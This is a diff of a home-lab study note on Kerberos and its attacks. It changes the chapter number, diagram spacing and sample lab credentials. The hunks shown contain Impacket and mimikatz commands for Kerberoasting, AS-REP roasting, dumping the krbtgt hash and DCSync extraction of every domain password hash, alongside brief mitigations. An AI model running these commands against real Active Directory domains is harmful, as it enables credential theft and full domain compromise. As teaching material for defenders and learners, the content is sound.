@@ -1,4 +1,4 @@
-# 05 — Kerberos: Authentication and Attacks
+# 02 — Kerberos: Authentication and Attacks
 
 ## What Is Kerberos
 
@@ -20,13 +20,13 @@ ticket to access services — without sending your password across the network.
 ```
 ┌──────────────────────────────────────────────────────┐
 │               Domain Controller (DC)                  │
-│                                                        │
+│                                                       │
 │  ┌─────────────────────────────────────────────────┐  │
 │  │        KDC — Key Distribution Center            │  │
-│  │                                                  │  │
+│  │                                                 │  │
 │  │  ┌──────────────┐    ┌──────────────────────┐   │  │
 │  │  │      AS      │    │        TGS           │   │  │
-│  │  │ Authentication│   │  Ticket Granting     │   │  │
+│  │  │Authentication│    │  Ticket Granting     │   │  │
 │  │  │   Service    │    │      Service         │   │  │
 │  │  └──────────────┘    └──────────────────────┘   │  │
 │  └─────────────────────────────────────────────────┘  │
@@ -163,8 +163,8 @@ Alice accesses file server:
 
 ```bash
 # With Impacket (from Kali, no domain join needed)
-python3 GetUserSPNs.py homelab.local/alice:Password1 \
-  -dc-ip 10.20.20.10 -request
+python3 GetUserSPNs.py homelab.local/alice.rossi:Password123! \
+  -dc-ip 10.10.10.10 -request
 
 # Output: Kerberos hashes
 $krb5tgs$23$*svc_sql$HOMELAB.LOCAL$homelab.local/svc_sql*$...
@@ -193,7 +193,7 @@ Use Group Managed Service Accounts (gMSA) — auto-rotating passwords.
 
 ```bash
 # Find users without pre-auth (Impacket)
-python3 GetNPUsers.py homelab.local/ -dc-ip 10.20.20.10 \
+python3 GetNPUsers.py homelab.local/ -dc-ip 10.10.10.10 \
   -usersfile users.txt -no-pass -format hashcat
 
 # Output
@@ -249,7 +249,7 @@ Restrict local admin rights.
 
 ```bash
 # Get krbtgt hash (with Domain Admin)
-python3 secretsdump.py homelab.local/Administrator:Password1@10.20.20.10
+python3 secretsdump.py homelab.local/Administrator:Adm1n!str4tor@10.10.10.10
 
 # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_HERE:::
 
@@ -310,7 +310,7 @@ sends all password hashes as part of normal replication.
 lsadump::dcsync /domain:homelab.local /all /csv
 
 # With Impacket (from Kali, remotely)
-python3 secretsdump.py homelab.local/Administrator:Password1@10.20.20.10
+python3 secretsdump.py homelab.local/Administrator:Adm1n!str4tor@10.10.10.10
 # Output: ALL NTLM hashes for ALL users in the domain
 ```
 
